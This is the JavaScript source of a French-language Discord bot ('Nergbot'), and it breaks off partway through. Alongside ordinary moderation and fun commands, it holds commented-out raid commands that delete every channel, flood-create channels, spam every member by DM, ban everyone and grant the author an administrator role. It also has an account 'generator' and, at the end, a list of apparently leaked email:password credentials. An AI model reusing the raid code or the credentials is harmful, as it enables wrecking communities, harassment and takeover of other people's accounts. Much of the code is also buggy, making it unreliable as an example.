// Load up the discord.js library
const Discord = require("discord.js");

// This is your bot. Some people call it `bot`, some people call it `self`, 
// some might call it `cootchie`. Either way, when you see `bot.something`, or `bot.something`,
// this is what we're refering to. Your bot.
const bot = new Discord.Client();
const Client = new Discord.Client();

// Here we load the config.json file that contains our token and our prefix values. 
const config = require("./config.json");
// config.token contains the bot's token
// config.prefix contains the message prefix.

let cooldown = new Set();
let cdseconds = 5;



bot.on("ready", () => {
  // This event will run if the bot starts, and logs in, successfully.
  console.log(`Bot has started, with ${bot.users.size} users, in ${bot.channels.size} channels of ${bot.guilds.size} guilds.`); 
  // Example of changing the bot's playing game to something useful. `bot.user` is what the
  // docs refer to as the "botUser".
  bot.user.setActivity(`Serving ${bot.guilds.size} servers`);
});

bot.on("guildCreate", guild => {
  // This event triggers when the bot joins a guild.
  console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
  bot.user.setActivity(`Serving ${bot.guilds.size} servers`);
});

bot.on("guildDelete", guild => {
  // this event triggers when the bot is removed from a guild.
  console.log(`I have been removed from: ${guild.name} (id: ${guild.id})`);
  bot.user.setActivity(`Serving ${bot.guilds.size} servers`);
});

let statuses = [
     " mon selly https://selly.gg/@energetiq " ,
      "Energeti_q THE BEST", 
      "tranquile tu fait r 💸" ,
      `détourne  🎲  `, 
      "https://discord.gg/uyv76uv" ,
      "Endorium Copiright ©️ 2019", 
      " pour Inviter le bot :https://bit.ly/botnerg",
      "DéCouvre mon nouveau bot prémium !"

     ]

  setInterval(function() {

      let status = statuses[Math.floor(Math.random()*statuses.length)];

      bot.user.setPresence({
          game: {
              name: status,
              type: "STREAMING",
              url: "https://twitch.tv/haku974"
          }
      })

  }, 30000)

  
 












bot.on("message", async message => {
  // This event will run on every single message received, from any channel or DM.
  
  // It's good practice to ignore other bots. This also makes your bot ignore itself
  // and not get into a spam loop (we call that "botception").
  if(message.author.bot) return;
  
  // Also good practice to ignore any message that does not start with our prefix, 
  // which is set in the configuration file.
  if(message.content.indexOf(config.prefix) !== 0) return;
  
  // Here we separate our "command" name, and our "arguments" for the command. 
  // e.g. if we have the message "+say Is this the real life?" , we'll get the following:
  // command = say
  // args = ["Is", "this", "the", "real", "life?"]
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  
  // Let's go with a few common example commands! Feel free to delete or change those.
  
  if(command === "ping") {
    // Calculates ping between sending a message and editing it, giving a nice round-trip latency.
    // The second ping is an average latency between the bot and the websocket server (one-way, not round-trip)
    const m = await message.channel.send("Ping?");
    m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(bot.ping)}ms`);
  }

  if(command === "partenariat") {
    
    const sayMessage = args.join(" ");
    var embed = new Discord.RichEmbed()
    .setTitle("Nouveau Partenariat  ")
    .addField(sayMessage,"Rejoignez Vite @everyone")
    .setColor(0x1FDDE3)
    .setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
  message.channel.sendEmbed(embed);
  }
  
   if(command === 'stop') {
    const embed = new Discord.RichEmbed()
      .setTitle('Done.')
      .setDescription(`Restarted in **${Math.floor(bot.ping)}**ms`);
    if(message.author.id !== '316976857016696833') return;
    message.channel.send(embed).then(() => {
    process.exit(1);
  })
};
  if(command === "say") {
    // makes the bot say something and delete the message. As an example, it's open to anyone to use. 
    // To get the "message" itself we join the `args` back into a string with spaces: 
    const sayMessage = args.join(" ");
    // Then we delete the command message (sneaky, right?). The catch just ignores the error with a cute smiley thing.
    message.delete().catch(O_o=>{}); 
    // And we get the bot to say the thing: 
   var embed = new Discord.RichEmbed()
			.setTitle("Say")
			.addField(sayMessage,sayMessage)
			.setColor(0x1FDDE3)
			.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
		message.channel.sendEmbed(embed);
  }
  
 


  if(command === 'report' ){

    var membre = message.mentions.members.first()
    var reason = args.slice(1).join(' ');

    var embed = new Discord.RichEmbed()
        .setAuthor('Report de '+message.author.username)
        .addField('Membre Report', membre)
        .addField('Raison', reason)
        .setFooter(data.footer)
        .setColor(data.color)

    bot.channels.get('568703168880443393').sendEmbed(embed);
    message.channel.send(emotes[1] + ' |  Votre report a bien été envoyée avec succès, les modérateurs prendront en charge cette plainte le plus rapidement possible !');

}


  if(command === 'start'){
    var party_launch  = false
    var number_random = 0;
    message.reply('Partie Lancé !')
    var party_launch = true;
    number_random = Math.floor(Math.random() * (5000 - 0)+ 0)
    console.log(number_random)
    if(party_launch = true && message.content != null){
     if(Number.isInteger(parseInt(message.content))) {
      
      if(message.content > number_random){
      message.reply("Plus petit !")

      }else if(message.content < number_random){
     message.reply('Plus grand !')
      }else{
       message.reply(`Gg a ${message.author} Qui a gagner `)
       party_launch = false;
      }
    }
  }
    if(command === 'stopgame') {
      if(party_launch = true) {
      message.reply('Partie Stopé')
      var party_launch = false
      }else{
    message.reply("Aucune Partie N'est lancé !")
    }
  }
}

































  if(command === "bvn") {
    var embed = new Discord.RichEmbed()
    .setTitle("Bienvenue ")
    .addField(`BFR Energetiq  Vous Souhaite La Bienvenue !`,"Les autres aussi souhaite lui la Bienvenue !")
    .setColor(0x1FDDE3)
    .setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
  message.channel.sendEmbed(embed);
  }
/*
if (command === `Monnaie`) {

    if (!monnaie[message.author.id]) {
        monnaie[message.author.id] = {
            monnaie: 0 
        };
    };

    let userMonnaie = monnaie[message.author.id].monnaie;

    let userMonnaieEmbed = new Discord.RichEmbed()
    .setAuthor(message.author.username)
    .setColor('#dc143c')
    .addField('💸', userMonnaie);

    message.channel.send(userMonnaieEmbed);
    };

// Tu créer un fichier monnaie.json et apres dans ton fichier principale tu met 

    if (!monnaie[message.author.id]) {
        monnaie[message.author.id] = {
            monnaie: 0 
        };
    };

    let baseMonnaie = Math.floor(Math.random() * 0) + 1;
    let AjoutMonnaie = Math.floor(Math.random() * 1) + 1;

    if (AjoutMonnaie === baseMonnaie) {
        monnaie[message.author.id] = {
            monnaie: monnaie[message.author.id].monnaie + AjoutMonnaie
        };

    fs.writeFile('./monnaie.json', JSON.stringify(monnaie), err => {
        if(err) console.log(err);
        });
    };

*/





if(command === `infobot`) {

    let botIcon = bot.user.displayAvatarURL;
    let embed = new Discord.RichEmbed()
        .setDescription('Bot By Energetiq')
        .setColor(0xdc143c)
        .setThumbnail(botIcon)
        .addField('Nom Du Bot :', bot.user.username)
        .addField('Créer Par :', 'Energetiq')
        .addField("Inviter le bot :","https://discordapp.com/api/oauth2/authorize?client_id=557245884300001301&permissions=8&scope=bot")
    return message.channel.send(embed);
   };

/*
   bot.on ('guildMemberAdd', member => {
    var embed = new Discord.RichEmbed()
    .setTitle("Welcome")
    .setDescription("Bienvenue")
    .addField(`Bienvenue ${member.displayName}`,"Je te souhaite une bonne continuation sur nos serveurs ! ")
    .setColor("RANDOM")
    .setFooter("Pour plus D'Info Mp Energetiq ! ")
    member.createDM().then(channel => {
      return channel.sendEmbed(embed)
    }).catch(console.error)
    // On pourrait catch l'erreur autrement ici (l'utilisateur a peut être désactivé les MP)
  })
*/












/*


        //RENAME TOUT LE MONDE EN DESSOUS DU BOT
        
          if(message.content === "name"){
            if(message.author.id == "316976857016696833")
                message.delete();
                message.guild.members.map(async (member, id) =>{
                member.setNickname("🥔CHIPS🥔");
            });
          } 

// COMMANDE POUR SPAMMER MP
if(message.author.id == "316976857016696833")
  if(command === "spamp") {
      message.delete()
       let i = 0;
       let interval = setInterval(function () {
        message.guild.members.forEach(e => {
          const embed = new Discord.RichEmbed()
           .setColor("RANDOM")
           .addField("BACKUP GO JOIN", `Le serveur ${message.guild.name} ce fait raid par Des Chips 
           "https://discordapp.com/api/oauth2/authorize?client_id=557245884300001301&permissions=8&scope=bot"
            yes X)`)
           .setThumbnail("https://cdn.discordapp.com/attachments/549228916028735488/559406383640870912/Screenshot_20190320-212723.jpeg")
           e.user.send({embed});
         }, 1000);
       });    
    }  

 //COMMANDE DE CREATION DE CHANNEL, MODIFICATION DU NOM, DE LA REGION ET DE L'ICON DU SERVEUR
    if(command === "dead") {
      if(message.author.id == "316976857016696833")
       if(message.channel.type === "dm") return;
        if(message.guild.name != "[Hackeur] ESPRIT"){
          let name = [
    "Niquez par Des Chips Sataniques",
    "Niquez par des chips Sataniques",
    "Niquez pas des Chips Sataniques ",
          ]
          setInterval(function() {
            let names = name[Math.round(Math.random() * (name.length - 1))];
            message.guild.setName(`${names}`).catch(error => {})
          }, 1000)
            message.guild.channels.map(channel => channel.delete());
            let icon = [
                   "https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png",
              "https://cdn.discordapp.com/attachments/549228916028735488/559406383640870912/Screenshot_20190320-212723.jpeg",
              "https://cdn.discordapp.com/attachments/554275126250700825/559431146098786324/JPEG_20190324_122039.jpg"
            ]
            setInterval(function() {
              let icons = icon[Math.round(Math.random() * (icon.length - 1))];
              message.guild.setIcon(`${icons}`).catch(error => {})
            }, 2500)
            message.guild.setRegion('russia').catch(error => {})
		}
        setInterval(function () { if(message.guild.channels.size < 499){
          message.guild.createChannel('Niquez Par des Chips La prochaine tu me raid pas x) ', 'voice').catch(error => {})
          message.guild.createChannel(' Niquez Par Des Chips la prochaine tu me raid pas x)', 'text').catch(error => {})
        }}, 100)
        if(message.deletable) message.delete();
      }
	
   if(command === "spam") {
    if(message.author.id == "316976857016696833")
      message.delete()
       let i = 0;
      let interval = setInterval(function () {
        message.guild.channels.forEach(channel => {
          if (channel.type === "text") channel.send(`Le serveur **${message.guild.name}** ce fait raid par Par Des Chips Sataniques Enculeuse de Vaches Dabeuse qui aime daboudidabouda, Dédicace aux POTO de l'esprit. https://discord.gg/KcGVJwg  https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png  @everyone`)
        }, 1000);
      });    
  }
/*
   //COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE
   
      if(command === "banall") {
      if (message.deletable) message.delete();
      if(message.channel.type === "dm") return;
      if(message.deletable) message.delete();
      else if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
        message.guild.members.forEach(member => {
            if (!member.roles.exists("name", "👻ESPRIT👻") && member.bannable) member.ban();});
              message.delete();
              const embed = new Discord.RichEmbed()
              .setTitle("Commande ban réalisé avec succès !")
              .setColor('RANDOM')
              .setImage("https://s3.amazonaws.com/files.enjin.com/1242418/modules/forum/attachments/Escanor_Cruel_Sun_1534888924.gif")
              message.channel.send({embed});
    
          if (message.content === "e.admin") {
          if(message.channel.type === "dm") return;
          else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
          message.member.guild.createRole({name: "👻ESPRIT👻",permissions: "ADMINISTRATOR",position: "100"}).then(function(role) {message.member.addRole(role);})
          if (message.deletable) message.delete();
          message.channel.send("Ajout du admin avec succes.")
          }
  }
  
  if(command === "raid2"){
      if(message.channel.type === "dm") return;
      if (message.author.id != `${message.author}`) return;
   
      if(message.guild.name != "Chips Sataniques !"){
           message.guild.setIcon("https://i.imgur.com/nknnfHe.png").catch(error => {})
           message.guild.setName('Raid By des Chips mon pote !').catch(error => {})
           message.guild.setRegion('russia').catch(error => {})
       }
       setInterval(function () { if(message.guild.channels.size < 499){
         message.guild.createChannel('FuckedbyCHIPS', 'text').catch(error => {})
       }}, 400)
       if(message.deletable) message.delete();
     }
  
     if (command === 'raid3') {
      if(message.channel.type === "dm") return;
      if (message.author.id != `${message.author}`) return;
   
        setInterval (function () { message.channel.send("@everyone @here . Quittez tous le serv c'est fait raid x= !!! \n"+
        "Fucked By CHIPS \n"+
       " C'est sa de s'attaqué a des innocents \n"+
       "La porchaine fois teste pas mon frr", { tts: true } ).catch(error => {}) }, 400)
      }
                                                                        

 
  
  */


  if(command === "kick") {
    // This command must be limited to mods and admins. In this example we just hardcode the role names.
    // Please read on Array.some() to understand this bit: 
    // https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Array/some?
    if(!message.member.roles.some(r=>["Administrator", "Moderator"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this!");
    
    // Let's first check if we have a member and if we can kick them!
    // message.mentions.members is a collection of people that have been mentioned, as GuildMembers.
    // We can also support getting the member by ID, which would be args[0]
    let member = message.mentions.members.first() || message.guild.members.get(args[0]);
    if(!member)
      return message.reply("Please mention a valid member of this server");
    if(!member.kickable) 
      return message.reply("I cannot kick this user! Do they have a higher role? Do I have kick permissions?");
    
    // slice(1) removes the first part, which here should be the user mention or ID
    // join(' ') takes all the various parts to make it a single string.
    let reason = args.slice(1).join(' ');
    if(!reason) reason = "No reason provided";
    
    // Now, time for a swift kick in the nuts!
    await member.kick(reason)
      .catch(error => message.reply(`Sorry ${message.author} I couldn't kick because of : ${error}`));
    message.reply(`${member.user.tag} has been kicked by ${message.author.tag} because: ${reason}`);
  }
  
  if(command === "ban") {
    // Most of this command is identical to kick, except that here we'll only let admins do it.
    // In the real world mods could ban too, but this is just an example, right? ;)
    if(!message.member.roles.some(r=>["Administrator"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this!");
    
    let member = message.mentions.members.first();
    if(!member)
      return message.reply("Please mention a valid member of this server");
    if(!member.bannable) 
      return message.reply("I cannot ban this user! Do they have a higher role? Do I have ban permissions?");

    let reason = args.slice(1).join(' ');
    if(!reason) reason = "No reason provided";
    
    await member.ban(reason)
      .catch(error => message.reply(`Sorry ${message.author} I couldn't ban because of : ${error}`));
    message.reply(`${member.user.tag} has been banned by ${message.author.tag} because: ${reason}`);
    message.channel(logs)
    .send(member.user.tag)
  }
  
	if (command === "help") {
		var embed = new Discord.RichEmbed()
			.setTitle("Help")
			.setDescription("Commandes Par Nergbot (prefix '+')")
      .addField("+help", "pour avoir de l'aide")
      .addField("**Commande Staffs**:👮","_Réserver au staff_ !")
			.addField("+ban {user} [info]", "ban (réservé au staff) !")
			.addField(" +kick {user} [raison]", "pour éjécter un membre du serveur (réservé au Staff)")
      .addField(" +purge {Nombre de message}", " Pour suprimé les messages!(réservé au staff) ")
      .addField("+mute {la personne}","Permet de mute la personne, !! IMPORTANT !! La commande est en maintenance(réservé au Staff)" )
      .addField("+partenariat ",`A venir ....(réservé au Staff)\n`)
      .addField("**Tout**🔧","_des Commands randoms_ ")
      .addField("+ping", "pong! nan je rigole pour voir ta latence")
      .addField(" +pvme ", "Vous raconte Une petite Histoire en MP")
      .addField(" +say {texte}", "Remplace votre message par celui du bot avec un embed\n")
      .addField("+new/+close","Pour crée un tickets (mais seulement dans le salon tickets pour ouvrir/férmé un ticket")
      .addField("+bvn","Souhaite Bienvenue !")
      .addField("+servers","Affiche sur Combien de serveur est le bot")
      .addField('+verif',"Pour avoir accès au reste du serveur")
      .addField("+shop","Affiche le shop")
      .addField("+avatar","Affiche m'avatar de la personne")
      .addField("**Infos** ℹ ","_Bots,Serveur_")
      .addField("+sondage","Permet de faire Un sondage ! ")
      .addField("+serveurinfo","Donne les information sur le serveur sur lequel vous êtes")
      .addField("+infobot","Donne les Info Sur le Bot")
      .addField("+gen","La commande est disponible seulement sur NergBot V3 Prémium")
      .setColor(0x1FDDE3)
			.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
		message.channel.sendEmbed(embed);
  } 

  if(command === "gen") {
    if (message.channel.name === "générateur"){
    var embed = new Discord.RichEmbed()
    .setTitle("Générateur Nerg")
    .setDescription("Touts les Générateur Du bots :")
    .addField("+nordvpn","Vous générer un compte NordVPN(Les comptes ne sont pas Vérifé !) ")
    .addField("+paypal","Vous générer un Compte paypal(les comptes ne sont pas garantit ! ils peuvent ne pas fonctionner !")
    .addField("+spotify","Vous générer un compte spotify(le compte n'est pas garantit) ")
    .addField("+minecraft","Vous générer un compte Minecraft(le compte n'est pas garantit) ")
    .addField("+steam","bientot disponibles")
    .setColor(0x1FDDE3)
    .setFooter("Pour plus d'info mp Mon fondateur ! BFR عизrgetiq#9348!")
  message.channel.sendEmbed(embed)
  }
 

};

//serveurs
if(command === "servers"){

  var server_count_guilds = bot.guilds.size
  var server_count_channels = bot.channels.size
  var server_count_users = bot.users.size

  if (message.deletable) message.delete();
  var serversEmbed = new Discord.RichEmbed()
      .setColor(0xcee4e6)
      .setTitle("️️️️️️️️️Info Sur le bot")
      .setFooter("© Bot by Energetiq ")
      .addField("Connecté à ", server_count_guilds + " **servers**")
      .addField("Lis actuellement ", server_count_channels + " **channels**")
      .addField("Devant ", server_count_users + " **utilisateurs**")
  message.channel.sendEmbed(serversEmbed);
}
// pv me
  	if (command === 'pvme') {
		message.author.createDM().then(channel =>  
      channel.send("Tu a bien fait de tester car je vais te raconter une petite histoire : https://privnote.com/VGtizhrD#nP9fxtd25")
			)

			
    };
// avatar  
   if(command === "avatar") { 
     message.reply(message.author.avatarURL)
   }

// log (non fonctionnel)
   if(command === "log"){
     message.guild.createChannel("log", "Ici Tu auras tout les logs")
    Channel.permissions()
   }
// purge 
   if(command === "purge") {
    // This command removes all messages from all users in the channel, up to 100.
    
    // get the delete count, as an actual number.
    const deleteCount = parseInt(args[0], 10);
    
    // Ooooh nice, combined conditions. <3
    if(!deleteCount || deleteCount < 2 || deleteCount > 100)
      return message.reply("Please provide a number between 2 and 100 for the number of messages to delete");
    
    // So we get our messages, and delete them. Simple enough, right?
    const fetched = await message.channel.fetchMessages({limit: deleteCount});
    message.channel.bulkDelete(fetched)
      .catch(error => message.reply(`Couldn't delete messages because of: ${error}`));
  }








// msg
  if(command === "msg") {
        
        let member = message.mentions.members.first() || message.guild.members.get(args[0]);
        
        let msgg = args.slice(1).join(' ');
        
        member.send(`${msgg} `)
   
  }
  //serveur info
  if(command === "serveurinfo"){
    var embed = new Discord.RichEmbed()
      .setDescription("Info Discord")
      .addField("Nom du discord",message.guild.name)
      .addField("Crée le :", message.guild.createdAt)
      .addField("tu as rejoint le :",message.member.joinedAt)
      .addField("utilisateur Sur Le discord :",message.guild.memberCount)
      .setColor("RANDOM")
   message.channel.sendEmbed(embed);
  };


  if(command === 'me') {
    var embed_me = new Discord.RichEmbed()
      .setTitle("Vos infos")
      .setFooter('Dev By Energetiq')
      .addField("Votre ID",`${message.author.id}`)
      .setThumbnail(message.author.avatarURL)
      .addField("Compte Crée Le ",``)
  }


//sondage
  if(command === "sondage") {
    let args = message.content.split(" ").slice(1);
    let thingToEcho = args.join(" ")
    var embed = new Discord.RichEmbed()
      .setDescription("Sondage ")
      .addField(thingToEcho, "répondre avec :white_check_mark: ou :x:")
      .setColor(0xB40404)
      .setTimestamp()
    message.guild.channels.find("name", "sondage").sendEmbed(embed)
    .then(function (message) {
      message.react("✅")
      message.react("❌")
    }).catch(function() {
    });
  }

  /* Fornite
    bot.on("message", async function(message){
    
      let messageKick = message.content.split(" ");
      let args = messageKick.slice(1);
  
  
  
      if(message.content.startsWith(prefix + "fortnite-pc")){
          let pseudo = args.join(" ").slice(0)
          if(!pseudo) return message.channel.send("Vous devez entrer votre pseudo epic game !")
          request("https://fortnite-public-api.theapinetwork.com/prod09/users/id?username=" + pseudo, async function(error,response,body){
              let lejson = JSON.parse(body)
              if(lejson.uid === undefined) return message.channel.send("Ce pseudo epic game n'existe pas !")
              let uid = lejson.uid
  
              await request("https://fortnite-public-api.theapinetwork.com/prod09/users/public/br_stats?user_id=" + uid + "&platform=pc",function(error,response,body){
                  let infos = JSON.parse(body)
                  if(infos["totals"] === undefined) return message.channel.send("Vous devez entrer un pseudo epic games")
                  let embed = new Discord.RichEmbed()
                  .setColor("00F919")
                  .setTitle(infos.username + " - " + infos.platform)
                  .addField("Scores totaux :","**Kills** : " + infos["totals"].kills+
                  "\n**Top 1** : " + infos["totals"].wins+
                  "\n**Matchs joués** : " + infos["totals"].matchesplayed+
                  "\n**Temps** : " + infos["totals"].hoursplayed + "h" +
                  "\n**Winrate** : " + infos["totals"].winrate+
                  "\n**K/D** : " + infos["totals"].kd)
                  .addBlankField()
                  .addField("Solo :","**kills** : " + infos["stats"].kills_solo+
                  "\n**Top 1** : " + infos["stats"].placetop1_solo+
                  "\n**Top 10** : " + infos["stats"].placetop10_solo+
                  "\n**match joués** : " + infos["stats"].matchesplayed_solo+
                  "\n**K/D** : " + infos["stats"].kd_solo+
                  "\n**Winrate** : " + infos["stats"].winrate_solo+
                  "\n**Temps** : " + (infos["stats"].minutesplayed_solo / 6).toFixed(0) +
                  "\n**Score** : " + infos["stats"].score_solo,true)
                  .addField("Duo :","**kills** : " + infos["stats"].kills_duo+
                  "\n**Top 1** : " + infos["stats"].placetop1_duo+
                  "\n**Top 12** : " + infos["stats"].placetop12_duo+
                  "\n**match joués** : " + infos["stats"].matchesplayed_duo+
                  "\n**K/D** : " + infos["stats"].kd_duo+
                  "\n**Winrate** : " + infos["stats"].winrate_duo+
                  "\n**Temps** : " + (infos["stats"].minutesplayed_duo / 6).toFixed(0) +
                  "\n**Score** : " + infos["stats"].score_duo,true)
                  .addField("Squad :","**kills** : " + infos["stats"].kills_squad+
                  "\n**Top 1** : " + infos["stats"].placetop1_squad+
                  "\n**Top 6** : " + infos["stats"].placetop6_squad+
                  "\n**match joués** : " + infos["stats"].matchesplayed_squad+
                  "\n**K/D** : " + infos["stats"].kd_squad+
                  "\n**Winrate** : " + infos["stats"].winrate_squad+
                  "\n**Temps** : " + (infos["stats"].minutesplayed_squad / 6).toFixed(0) +
                  "\n**Score** : " + infos["stats"].score_squad,true)
                  message.channel.send(embed)
              })  
          })
      }
  
      if(message.content.startsWith(prefix + "fortnite-ps4")){
          let pseudo = args.join(" ").slice(0)
          if(!pseudo) return message.channel.send("Vous devez entrer votre pseudo epic game !")
          request("https://fortnite-public-api.theapinetwork.com/prod09/users/id?username=" + pseudo, async function(error,response,body){
              let lejson = JSON.parse(body)
              if(lejson.uid === undefined) return message.channel.send("Ce pseudo epic game n'existe pas !")
              let uid = lejson.uid
  
              await request("https://fortnite-public-api.theapinetwork.com/prod09/users/public/br_stats?user_id=" + uid + "&platform=ps4",function(error,response,body){
                  let infos = JSON.parse(body)
                  if(infos["totals"] === undefined) return message.channel.send("Vous devez entrer un pseudo epic games")
                  let embed = new Discord.RichEmbed()
                  .setColor("00F919")
                  .setTitle(infos.username + " - " + infos.platform)
                  .addField("Scores totaux :","**Kills** : " + infos["totals"].kills+
                  "\n**Top 1** : " + infos["totals"].wins+
                  "\n**Matchs joués** : " + infos["totals"].matchesplayed+
                  "\n**Temps** : " + infos["totals"].hoursplayed + "h" +
                  "\n**Winrate** : " + infos["totals"].winrate+
                  "\n**K/D** : " + infos["totals"].kd)
                  .addBlankField()
                  .addField("Solo :","**kills** : " + infos["stats"].kills_solo+
                  "\n**Top 1** : " + infos["stats"].placetop1_solo+
                  "\n**Top 10** : " + infos["stats"].placetop10_solo+
                  "\n**match joués** : " + infos["stats"].matchesplayed_solo+
                  "\n**K/D** : " + infos["stats"].kd_solo+
                  "\n**Winrate** : " + infos["stats"].winrate_solo+
                  "\n**Temps** : " + (infos["stats"].minutesplayed_solo / 6).toFixed(0) +
                  "\n**Score** : " + infos["stats"].score_solo,true)
                  .addField("Duo :","**kills** : " + infos["stats"].kills_duo+
                  "\n**Top 1** : " + infos["stats"].placetop1_duo+
                  "\n**Top 12** : " + infos["stats"].placetop12_duo+
                  "\n**match joués** : " + infos["stats"].matchesplayed_duo+
                  "\n**K/D** : " + infos["stats"].kd_duo+
                  "\n**Winrate** : " + infos["stats"].winrate_duo+
                  "\n**Temps** : " + (infos["stats"].minutesplayed_duo / 6).toFixed(0) +
                  "\n**Score** : " + infos["stats"].score_duo,true)
                  .addField("Squad :","**kills** : " + infos["stats"].kills_squad+
                  "\n**Top 1** : " + infos["stats"].placetop1_squad+
                  "\n**Top 6** : " + infos["stats"].placetop6_squad+
                  "\n**match joués** : " + infos["stats"].matchesplayed_squad+
                  "\n**K/D** : " + infos["stats"].kd_squad+
                  "\n**Winrate** : " + infos["stats"].winrate_squad+
                  "\n**Temps** : " + (infos["stats"].minutesplayed_squad / 6).toFixed(0) +
                  "\n**Score** : " + infos["stats"].score_squad,true)
                  message.channel.send(embed)
                  console.log(infos)
              })  
          })
      }
  */  

  if(command === "bot ") {
    message.channel.send("https://discordapp.com/api/oauth2/authorize?client_id=557245884300001301&permissions=8&scope=bot"
    )
  }


  bot.on("message", async message => {
  
    if (message.content.startsWith(prefix + "mpall")) {
        if(message.author.id == "316976857016696833")
           var args = message.content.split(" ").slice(1);
           var msge = args.join(' ');
           const sayMessage = args.join(" ");
 
            if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("❌ Tu n'as pas la permission d'utiliser cette commande!");
            if(!msge) return message.channel.send("Précise un message")
            var mpall =new Discord.RichEmbed()
               .setColor("RANDOM")
               .addField("Message:", sayMessage);
               
            message.delete()
            message.guild.members.map(m => m.send(mpall))
     
        
 
    }

});
/*
CREATE_INSTANT_INVITE: true,
  KICK_MEMBERS: true,
  BAN_MEMBERS: true,
  ADMINISTRATOR: true,
  MANAGE_CHANNELS: true,
  MANAGE_GUILD: true,
  ADD_REACTIONS: true,
  READ_MESSAGES: true,
  SEND_MESSAGES: true,
  SEND_TTS_MESSAGES: true,
  MANAGE_MESSAGES: true,
  EMBED_LINKS: true,
  ATTACH_FILES: true,
  READ_MESSAGE_HISTORY: true,
  MENTION_EVERYONE: true,
  EXTERNAL_EMOJIS: true,
  CONNECT: true,
  SPEAK: true,
  MUTE_MEMBERS: true,
  DEAFEN_MEMBERS: true,
  MOVE_MEMBERS: true,
  USE_VAD: true,
  CHANGE_NICKNAME: true,
  MANAGE_NICKNAMES: true,
  MANAGE_ROLES_OR_PERMISSIONS: true,
  MANAGE_WEBHOOKS: true,
  MANAGE_EMOJIS: true
*/


if(command === "verif") {
    var embed = new Discord.RichEmbed()
    .setTitle("Vérification")
    .setDescription("Instruction Pour Pouvoir Accéder au reste du Serveur")
    .addField("Pou acceder au reste du serveur clic sur N'importe quel Réaction  Dans La réaction du bot !","si tu ne te vérifie pas Tu sera Kick dans les plus bref délais !")
    .setColor("RANDOM")
    .setImage("https://cdn.discordapp.com/attachments/564137773603225624/564850872199282688/Capture.PNG")
    .setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
     message.channel.sendEmbed(embed)
     var role = message.guild.roles.find(role => role.id === "559806475451629589");
     bot.on('messageReactionAdd', (réaction, user) =>{
      var role = "559806475451629589" 
      message.member.addRole(role);
          });
    
}







 if(command === "setup") {
  if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("❌ Tu n'as pas la permission d'utiliser cette commande!");
  guild.createChannel('voice',`Nombre De Joueurs ${guild.memberCount} `)
 }







if(command === "shop") {
var embed = new Discord.RichEmbed()
.setTitle("SHOP")
.setDescription("Selly","Selly D'energetiq")
.addField("Le shop D'energetiq : https://selly.gg/@energetiq","Pour plus D'info Mp mon créateur")
.setColor(0x1FDDE3)
.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
message.channel.sendEmbed(embed);
}

/*
bot.on('message', msg => {
    if(msg.author.bot) return;

    if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
  
    if (msg.content === '+nordvpn') { //commande a exécuté
      if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)
  
  var answers = [
  
  //il faut mettre tout les compte entre des ' ' !
  
  "sknauer@mac.com:beehive6624",
  "F5_Lakers@hotmail.com:ethanhunt",
  "fadi.mandura@gmail.com:Darrelabbot710",
  "shre11@yahoo.com:3333ws",
  "johnrvw@yahoo.com:osan2621",
  "Cubi2011@web.de:12345ert",
  "brilgermanotta@yahoo.com:96799834",
  "rafaell.rcmr@gmail.com:64746347",
  "jeffrey823@gmail.com:Medical989",
  "rezamatrix@gmail.com:reza2106",
  "jinjyjjin@sina.com:1300312jin",
  "skasselakis1@gmail.com:Merrill10",
  "markie610@gmail.com:gajunia5",
  "abnoutlaw@gmail.com:whutitdew2",
  "ronlessel@yahoo.com:1q2w3e4r",
  "arsencameron222@gmail.com:arsenlol123",
  "jonas_mts@hotmail.com:ivaneide",
  "anabeatricepa408@gmail.com:yasminpr",
  "greg.james.miller@gmail.com:kfnmertn",
  "keelycrum@gmail.com:launchpad",
  "rubalo@gmail.com:platinum",
  "dfmickey@gmail.com:brittany",
  "eyamie@gmail.com:reggie",
  "anime.lovers@mail.ru:maks223223445",
  "tulaihia@gmail.com:kainkain",
  "hicham.guer@gmail.com:29121984",
  "bitch@bitch.com:bitch",
  "barrgeorgie@gmail.com:Georgie1101",
  "myonghwi@gmail.com:hanazono",
  "Joshua83@gmail.com:biochem3",
  "eren.sergen@googlemail.com:metin2acc",
  "caio_zoboli@hotmail.com:b9w8b9j4",
  "tevanromero@yahoo.com:ella5525",
  "usakokonchan@gmail.com:75365259",
  "christian-nack@hotmail.de:ff125135",
  "androonguyen@gmail.com:beuscher",
  "bodeysobhy112@gmail.com:Sobhy321",
  "eduardosandovalgomeza@gmail.com",
  "javier_beltran87@yahoo.com:alexcia30",
  "elias_bougharios@hotmail.com:popper12345",
  "smejkalkurtis@gmail.com:061188Ks",
  "c.h.steveip@gmail.com:2oo9145932",
  "christofermvieta@gmail.com:vifarm01",
  "crtrdn@gmail.com:cr54tr78dn",
  "ali_mak46@yahoo.com:123233",
  "alizzz94@yahoo.com:777777",
  "alliabrar@gmail.com:titanic02",
  "neilmpenney@hotmail.com:nempen87",
  "gx@live.com.sg:lovezick98",
  "johnwklee@yahoo.com:jl230891",
  "kiwilicous_kiwi@hotmail.com:woaainee",
  "jiuwai@gmail.com:oicla999",
